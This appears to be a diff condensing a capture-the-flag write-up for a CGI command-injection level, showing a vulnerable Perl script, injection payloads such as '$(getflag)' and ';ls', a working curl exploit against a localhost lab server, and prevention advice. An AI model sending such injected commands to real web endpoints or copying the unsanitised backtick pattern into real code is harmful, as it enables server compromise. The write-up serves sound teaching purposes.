@@ -1,15 +1,12 @@
 # Level 04 - CGI Command Injection
 
-## 🎯 Objective
+## Objective
 Exploit a web CGI script to execute commands as `flag04`.
 
-## 🧠 My Thought Process
+## My Notes
 
-### Step 1: "A Perl CGI script on a web server"
+Found a Perl CGI script:
 ```bash
-ls -la
-# -rwsr-sr-x 1 flag04 level04 152 level04.pl
-
 cat level04.pl
 ```
 
@@ -20,139 +17,54 @@ use CGI qw{param};
 print "Content-type: text/html\n\n";
 sub x {
   $y = $_[0];
-  print `echo $y 2>&1`;   # ← VULNERABLE LINE!
+  print `echo $y 2>&1`;   # ← VULNERABLE!
 }
 x(param("x"));
 ```
 
-### Step 2: "Analyzing the vulnerability"
-The dangerous line is:
-```perl
-print `echo $y 2>&1`;
-```
+The dangerous line is `print \`echo $y 2>&1\`;` - backticks in Perl execute shell commands, and `$y` comes directly from the URL parameter with no sanitization.
 
-**What happens here:**
-1. `param("x")` gets the URL parameter `x`
-2. It's passed directly to the shell via backticks (`` ` ``)
-3. No sanitization or escaping!
+The script runs on port 4747. If I visit `http://localhost:4747/level04.pl?x=hello`, it executes `echo hello 2>&1`. But I can inject shell commands.
 
-**The backticks in Perl execute shell commands**, just like `$()` in bash.
+Command injection options:
+- `;getflag` → runs getflag after echo
+- `$(getflag)` → command substitution
+- `` `getflag` `` → nested backticks
 
-### Step 3: "Understanding the attack surface"
-The script runs on port 4747. If I visit:
-```
-http://localhost:4747/level04.pl?x=hello
-```
-
-The server executes:
-```bash
-echo hello 2>&1
-```
-
-**But what if I inject shell commands?**
-
-### Step 4: "Crafting the payload"
-I need to inject a command. Options:
-- `;getflag` → `echo ;getflag` (runs getflag after echo)
-- `$(getflag)` → `echo $(getflag)` (command substitution)
-- `` `getflag` `` → `echo `getflag`` (nested backticks)
-
-I chose `$(getflag)` for clarity:
-
+Used `$(getflag)`:
 ```bash
 curl 'http://localhost:4747/level04.pl?x=$(getflag)'
 ```
 
-### Step 5: "Why it works"
-When the server processes this:
-```perl
-$y = "$(getflag)";
-print `echo $(getflag) 2>&1`;
-```
+When processed, `$y = "$(getflag)"` gets passed to the shell. The shell expands `$(getflag)`, runs getflag, and substitutes the output into the echo command.
 
-The shell expands `$(getflag)`:
-1. Runs `getflag` → Returns the token
-2. Substitutes the output into the echo command
-3. Echo prints the token!
+Token: `ne2searoevaevoem4ov4ar8ap`
 
-## ✅ Solution
+## Solution
 ```bash
 curl 'http://localhost:4747/level04.pl?x=$(getflag)'
 ```
 
-**Token:** `ne2searoevaevoem4ov4ar8ap`
+## Key Takeaways
 
-## 📚 Concepts to Learn
+**CGI (Common Gateway Interface):** Old protocol for server-side scripts. Browser → web server → CGI script → HTML → browser. CGI scripts often run with web server privileges, making them good targets.
 
-### 1. CGI (Common Gateway Interface)
-CGI is an old protocol for running server-side scripts:
-- Browser sends request → Web server → CGI script
-- Script generates HTML → Web server → Browser
+**Command injection:** User input passed to shell without sanitization. Can inject commands using `;`, `$()`, `` ` ``, `|`, `&&`, etc.
 
-**CGI scripts often run with the web server's privileges**, making them attractive targets.
+**Perl backticks:** Backticks in Perl execute shell commands, just like `$()` in bash. Also dangerous: `system()`, `exec()`, `open()` with pipes.
 
-### 2. Command Injection
-**Command injection** occurs when user input is passed to a shell without proper sanitization.
+**URL encoding:** Special chars need encoding (`$` = `%24`, `` ` `` = `%60`, `;` = `%3B`), but shell still interprets them after web server decodes.
 
-| Input | Resulting Command | Effect |
-|-------|-------------------|--------|
-| `hello` | `echo hello` | Normal |
-| `;ls` | `echo ;ls` | Lists directory |
-| `$(whoami)` | `echo $(whoami)` | Shows username |
-| `` `id` `` | `` echo `id` `` | Shows user ID |
+**Execution flow:** Attacker crafts URL → web server → CGI script (runs with flag04 SUID) → user input in backticks → shell executes → getflag runs as flag04.
 
-### 3. Dangerous Perl Constructs
-```perl
-# DANGEROUS - shell execution
-`command $user_input`          # Backticks
-system("command $user_input")  # system()
-open(FH, "|command $input")    # Pipe open
-exec("command $user_input")    # exec()
+## Tools Used
+- `curl` - HTTP client
+- Browser also works
 
-# SAFER alternatives
-system("command", $user_input)  # List form (no shell)
-open(FH, "|-", "command")       # Three-arg open
-```
-
-### 4. URL Encoding
-Special characters must be encoded in URLs:
-| Character | Encoded |
-|-----------|---------|
-| Space | `%20` or `+` |
-| `$` | `%24` |
-| `` ` `` | `%60` |
-| `;` | `%3B` |
-
-The shell still interprets these after the web server decodes them!
-
-### 5. The Execution Flow
-```
-1. Attacker crafts malicious URL
-   ↓
-2. Web server receives request
-   ↓
-3. CGI script starts with flag04's SUID privileges
-   ↓
-4. User input goes into backticks
-   ↓
-5. Shell executes malicious command
-   ↓
-6. getflag runs as flag04!
-```
-
-## 🔧 Tools Used
-- `curl` - Command-line HTTP client
-- `cat` - Read script contents
-- Web browser (alternative to curl)
-
-## 🛡️ How to Prevent This
-1. **Never pass user input to shell commands**
-2. **Use parameterized commands:**
-   ```perl
-   # Instead of: system("echo $input")
-   # Use: system("echo", $input)  # No shell interpretation
-   ```
-3. **Whitelist valid input** - Reject anything unexpected
-4. **Escape special characters** - Use `quotemeta()` in Perl
-5. **Use modern frameworks** - They handle escaping automatically
-6. **Run CGI with minimal privileges** - Don't use SUID unless necessary
+## Prevention
+- Never pass user input to shell commands
+- Use parameterized commands: `system("echo", $input)` instead of `system("echo $input")`
+- Whitelist valid input
+- Escape special chars with `quotemeta()` in Perl
+- Use modern frameworks with automatic escaping
+- Run CGI with minimal privileges
